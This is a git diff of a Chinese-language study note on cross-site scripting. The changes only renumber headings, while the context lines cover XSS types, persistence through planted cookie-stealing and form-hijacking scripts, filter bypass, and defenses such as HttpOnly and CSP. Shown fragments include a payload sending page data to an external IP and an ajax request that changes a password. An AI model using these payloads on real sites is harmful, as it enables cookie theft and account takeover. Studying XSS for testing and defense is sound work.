@@ -2,7 +2,7 @@
 
 [TOC]
 
-# 1.原理
+# 原理
 
 网站中包含大量的动态内容以提高用户体验，比过去要复杂得多。所谓动态内容，就是根据用户环境和需要，Web应用程序能够输出相应的内容。动态站点会受到一种名为“跨站脚本攻击”（Cross Site Scripting，安全专家们通常将其缩写成XSS,原本应当是CSS，但为了和层叠样式表（Cascading Style Sheet,CSS）有所区分，故称XSS的威胁，而**静态站点则完全不受其影响**。恶意攻击者会在 Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。
 
@@ -16,11 +16,11 @@ XSS漏洞通常是通过php的输出函数将javascript代码输出到html页面
 
 - 比如说php中的脚本的输出函数，常见的输出函数有：`print`、`print_r`、`echo`、`printf`、`sprintf`、`die`、`var_dump`、`var_export`、`document.getElementByld(“x” ).innerHTML`、`document.write`
 
-# 2.分类
+# 分类
 
 
 
-## 1.反射型
+## 反射型
 
 原理：
 
@@ -50,7 +50,7 @@ XSS漏洞通常是通过php的输出函数将javascript代码输出到html页面
    
    
 
-## 2.存储型
+## 存储型
 
 原理：
 
@@ -72,7 +72,7 @@ XSS漏洞通常是通过php的输出函数将javascript代码输出到html页面
 
    用户提交订单时，把订单信息换成XSS语句，管理员在后台查看订单时XSS被执行
 
-## 3.DOM型
+## DOM型
 
 原理：
 
@@ -106,7 +106,7 @@ XSS漏洞通常是通过php的输出函数将javascript代码输出到html页面
 
 [DOM型XSS_xss的dom型什么意思-CSDN博客](https://blog.csdn.net/ssslq/article/details/129342422?ops_request_misc=%7B%22request%5Fid%22%3A%22172027336716777224445537%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=172027336716777224445537&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-129342422-null-null.142^v100^pc_search_result_base9&utm_term=XSSDOM&spm=1018.2226.3001.4187)
 
-## 4.flash XSS
+## flash XSS
 
 原理：
 
@@ -140,7 +140,7 @@ SWF（Shockwave Flash）是一种由Adobe公司开发的多媒体、矢量图形
 
 [Flash XSS攻击总结 - SecPulse.COM | 安全脉搏](https://www.secpulse.com/archives/44299.html)
 
-## 5.pdf XSS
+## pdf XSS
 
 原理：
 
@@ -156,7 +156,7 @@ SWF（Shockwave Flash）是一种由Adobe公司开发的多媒体、矢量图形
 2. 上传pdf
 3. pdf地址钓鱼
 
-## 6.uXSS (universal通用)
+## uXSS (universal通用)
 
 原理：
 
@@ -170,7 +170,7 @@ SWF（Shockwave Flash）是一种由Adobe公司开发的多媒体、矢量图形
 
 
 
-## 7.其他XSS(mXSS, UTF-7 XSS, MHTML XSS, CSS XSS, VBScript XSS )
+## 其他XSS(mXSS, UTF-7 XSS, MHTML XSS, CSS XSS, VBScript XSS )
 
 [跨站的艺术-XSS入门与介绍  Fooying](https://www.fooying.com/the-art-of-xss-1-introduction/#flash-xss)
 
@@ -178,11 +178,11 @@ SWF（Shockwave Flash）是一种由Adobe公司开发的多媒体、矢量图形
 
 
 
-# 3.结合XSS的权限维持
+# 结合XSS的权限维持
 
 
 
-## 1.后台植入XSS   获取Cookie & 表单劫持
+## 后台植入XSS   获取Cookie & 表单劫持
 
 条件：已取得相关web权限后  
 
@@ -219,7 +219,7 @@ SWF（Shockwave Flash）是一种由Adobe公司开发的多媒体、矢量图形
    ?>
    ```
 
-## 2.XSS钓鱼配合MSF上线   Flash捆绑后门&浏览器网马
+## XSS钓鱼配合MSF上线   Flash捆绑后门&浏览器网马
 
 1. Flash捆绑后门
 
@@ -255,7 +255,7 @@ SWF（Shockwave Flash）是一种由Adobe公司开发的多媒体、矢量图形
 
    2. XSS诱使受害者访问URL-语言要适当
 
-# 4.XSS过滤绕过
+# XSS过滤绕过
 
 反射型-直接远程调用 
 
@@ -311,15 +311,15 @@ window.location.href='http://47.94.236.117/get.php?c='+value.inne
   ```javascript
   <script>$.ajax({url:'http://127.0.0.1/api/change.php',type:'post',data:{pass:'123'}});</script>
 
-# 5.防御手段
+# 防御手段
 
 
 
-## 1.过滤一些危险字符。转义`&<>‘ “`等危险字符。自定义过滤函数，网上有很多。
+## 过滤一些危险字符。转义`&<>‘ “`等危险字符。自定义过滤函数，网上有很多。
 
 
 
-## 2.HTTP-Only
+## HTTP-Only
 
 - 在php.ini设置`session.cookie_httponly = Ture`
 - 在代码中加入`<?php setcookie("TestCookie", "TestValue", time()+3600, "/", "", false, true);?>`最后一个参数`true`将cookie设置为HTTP-Only，这意味着它不能通过JavaScript访问。
@@ -327,7 +327,7 @@ window.location.href='http://47.94.236.117/get.php?c='+value.inne
 
 
 
-## 3.CSP (Content Security Policy)
+## CSP (Content Security Policy)
 
 内容安全策略CSP是一种基于HTTP头的安全特性，可以帮助防止跨站脚本（XSS）、数据注入等攻击。CSP允许网站管理员指定允许加载和执行的资源来源，从而减少恶意内容的注入和执行的风险。
 
@@ -374,5 +374,5 @@ CSP通过定义一系列策略来控制网页中哪些资源可以被加载和�
 
 
 
-## 4.输入内容长度限制，实体转义
+## 输入内容长度限制，实体转义
 
